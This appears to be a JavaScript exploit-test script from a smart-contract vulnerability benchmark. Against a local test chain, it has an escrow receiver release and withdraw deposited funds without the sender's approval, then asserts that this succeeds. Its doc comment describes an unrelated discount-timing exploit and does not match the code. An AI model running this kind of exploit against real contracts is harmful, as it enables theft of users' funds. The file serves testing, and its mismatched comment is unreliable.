require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');
let logger = require('@lib/logging/logger');
const { setTimeout } = require('timers');
const { sleep } = require('@lib/os/process');



// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');

let source = fs.readFileSync(path.join(contractsDir, 'src', 'Escrow.sol'), 'utf8');

/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    try {
        // Compile the contract to get ABI
        let solcVersion = extractSolcVersion(source);
        let { abi } = await compileWithVersion(source, 'Escrow', solcVersion);

        // Load the deployed contract
        let contractInstance = await new web3.eth.Contract(abi, contractAddress);

        // Accounts
        const senderAccount = envInfo.accounts[0]; // The sender's account
        const receiverAccount = envInfo.accounts[1]; // The receiver's account

        // Step 1: Place the amount in escrow
        const escrowAmount = web3.utils.toWei("1", "ether"); // Example: 1 Ether

        // Send funds from sender's account
        let res = await contractInstance.methods.placeInEscrow().send({
            from: senderAccount,
            value: escrowAmount,
            gas: 300000
        });

                

        if (res.status) {
            await sleep(1000);

            // Step 2: Receiver attempts to withdraw funds without sender's approval
            res = await contractInstance.methods.releaseByReceiver().send({
                from: receiverAccount,
                gas: 300000
            });


            if (res.status) {
                
                await sleep(1000);

                // Move forward in time (assuming delayUntilRelease is short for testing)
                await web3.currentProvider.send({
                    jsonrpc: "2.0",
                    method: "evm_increaseTime",
                    params: [60], 
                    id: 0
                }, () => {});

                // Attempt to withdraw
                const withdrawReceipt = await contractInstance.methods.withdrawFromEscrow().send({
                    from: receiverAccount,
                    gas: 300000
                });

                if (withdrawReceipt.status) {
                    logger.info(chalk.green("Exploit successful! Funds withdrawn without sender's approval."));
                    return true;
                } else {
                    logger.error(chalk.red("Exploit failed!"));
                    return false;
                }
                            
            }
            return false;
            
        }
    } catch (error) {
        logger.error(error.stack);
        return false;
    }
}



/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
